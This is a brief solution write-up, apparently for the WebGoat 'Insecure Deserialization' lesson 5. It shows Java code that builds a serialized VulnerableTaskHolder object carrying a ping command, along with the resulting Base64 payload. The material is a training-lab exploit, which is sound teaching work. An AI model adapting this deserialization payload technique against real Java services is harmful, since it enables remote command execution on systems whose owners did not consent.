# (A8) Insecure Deserialization

## Lesson 5
WebGoat project contains a vulnerable class `VulnerableTaskHolder.java`. This is how
you construct your payload:
```
var byteStream = new ByteArrayOutputStream();
var objectStream = new ObjectOutputStream(byteStream);
objectStream.writeObject(new VulnerableTaskHolder("myTask", "ping 127.0.0.1 -n 6"));
String payload = Base64.getEncoder().encodeToString(byteStream.toByteArray());
System.out.println(payload);
```

The payload (for Windows) is:
```
rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfkBAUKMA0bu3KYeHQAE3BpbmcgMTI3LjAuMC4xIC1uIDZ0AAZteVRhc2s=
```